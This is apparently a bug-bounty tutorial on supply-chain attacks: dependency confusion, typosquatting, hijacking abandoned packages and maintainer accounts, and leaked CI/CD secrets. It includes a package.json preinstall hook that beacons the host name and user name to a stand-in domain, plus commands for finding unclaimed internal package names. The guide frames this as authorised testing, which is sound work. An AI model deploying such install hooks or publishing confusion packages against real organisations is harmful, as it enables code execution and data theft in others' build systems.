# Dependency Confusion and Supply Chain

Sometimes the fastest path into a company is not their app but their build pipeline. Dependency confusion, typosquatting, and leaked CI secrets let you run code inside the organization's trusted systems, which is often a bigger win than any single web bug. These are high-impact, frequently-accepted bug bounty findings that most app-focused testers never look for.

## The mental model

Modern software pulls hundreds of third-party packages from public registries (npm, PyPI, RubyGems, Maven, NuGet) at build time. If you can get the victim's build to fetch a package you control, your code runs in their CI/CD, developer machines, or production, with whatever access those have. Dependency confusion exploits the resolver preferring a public package over the intended private one; typosquatting exploits human typos; and leaked pipeline secrets let you push malicious artifacts directly. The target is the build, not the browser.

## Where it hides / tell-tales

- **Leaked internal package names**: private/internal package names appearing in public JS bundles, `package.json`, source maps, GitHub repos, Docker images, or error messages. An internal name that is not claimed on the public registry is the setup for dependency confusion.
- **Misconfigured package managers**: a build that checks the public registry for a package that should only come from a private feed, or that lacks scope/namespace protection, so a public package with the same name and a higher version wins.
- **Public source and artifacts**: company GitHub repos, gists, CI config (`.github/workflows`, `.gitlab-ci.yml`), Dockerfiles, and published images that reveal internal package names, registry URLs, and sometimes secrets.
- **Exposed CI/CD**: build logs leaking tokens, publicly writable artifact repos, self-hosted runners reachable from the internet, and tokens with broad scope.
- **Typo-prone and abandoned packages**: popular package names with easy typos, and maintainer accounts/packages that are abandoned and hijackable.

## Real material

Dependency-confusion setup (concept): the victim's project references an internal package `@acme/auth-utils` that exists only on their private feed. You publish a package named `@acme/auth-utils` (or the unscoped `auth-utils` they also reference) to the public registry with a higher version number. If their resolver consults the public registry and prefers the higher version, your package is installed and its install script runs in their build.

```json
// a malicious package.json install hook (proof-of-concept beacon, not destructive)
{
  "name": "internal-pkg-name",
  "version": "99.0.0",
  "scripts": { "preinstall": "node -e \"require('https').get('https://evil.tld/c?h='+require('os').hostname()+'&u='+require('os').userInfo().username)\"" }
}
```
A benign DNS/HTTP callback with the hostname/username proves execution inside their environment without doing harm; that callback is the PoC.

Finding internal names to target:

```
# grep public artifacts for internal package references and private registry URLs:
grep -rinE '@[a-z0-9-]+/[a-z0-9-]+|registry|artifactory|nexus|npm.pkg.github' bundle.js
# check whether an internal-looking name is unclaimed on the public registry:
npm view @acme/auth-utils       # 404 -> claimable -> confusion candidate
pip index versions acme-internal
```

## Beyond the basics

- **Scope the blast radius before firing**: where the package executes defines impact: a developer's laptop, a CI runner with cloud credentials, or a production build. A callback that leaks `hostname`, `whoami`, env var names (not values), and internal IPs proves reach without exfiltrating secrets; stop there and report. Do not run destructive payloads or steal real credentials.
- **Version-number games**: resolvers often pick the highest version. Publishing `99.x` or a high semver to the public registry is the classic trick to win over a legitimate lower private version. Namespace/scope reservation and `.npmrc`/registry pinning are the defenses whose absence you are testing.
- **Typosquatting and combosquatting**: register plausible typos (`requsts`, `python-dateutil` vs `python-dateutils`), or names that combine words a developer might guess. Lower reliability than confusion, but real.
- **Hijacking abandoned packages and maintainers**: expired maintainer email domains (re-register the domain, reset the registry account), unmaintained-but-popular packages, and account takeovers of maintainers push malicious updates to everyone who depends on them. This is the mechanism behind several real-world supply-chain incidents.
- **CI/CD secret leakage and pipeline abuse**: tokens in build logs, in public repos, or in artifacts; overly-scoped CI tokens; and self-hosted runners that execute untrusted PR code (a fork PR that modifies the workflow to exfiltrate secrets). The pipeline is a high-value target because its credentials usually reach production and cloud.
- **Lockfile and integrity gaps**: missing lockfiles, disabled integrity checking, or `latest`-pinned dependencies let a malicious version slip in silently. Postinstall/preinstall scripts are the execution mechanism to watch.
- **Internal tooling and registries exposed**: an internet-reachable Artifactory/Nexus/npm-enterprise with weak auth lets you publish directly to the feed the builds trust, which is dependency confusion without even needing the public registry.

## What to watch for

- Dependency-confusion PoCs run code inside someone else's environment; keep the payload a harmless, non-destructive callback that proves execution and reach, and never exfiltrate real secrets or data. This is both ethical and usually a program requirement.
- Publishing a package to a public registry is a public, somewhat irreversible act; name it clearly as a security PoC, keep it benign, and remove it after. Confirm the program permits this class of testing.
- A callback could fire from an unintended third party who also uses that name; scope your proof and interpret results carefully.
- Confirm the internal name is genuinely the target's and unclaimed before publishing; do not squat unrelated names.

## Hunting checklist

- Harvest internal package names and private registry URLs from bundles, repos, Docker images, and CI config.
- Check whether internal-looking names are unclaimed on public registries.
- Where permitted, publish a benign higher-version package and observe a harmless callback proving build execution; capture hostname/user/reach only.
- Look for typosquat and abandoned-package/maintainer opportunities.
- Review public CI/CD config and logs for leaked tokens and fork-PR workflow execution.
- Check for internet-exposed internal registries with weak auth.
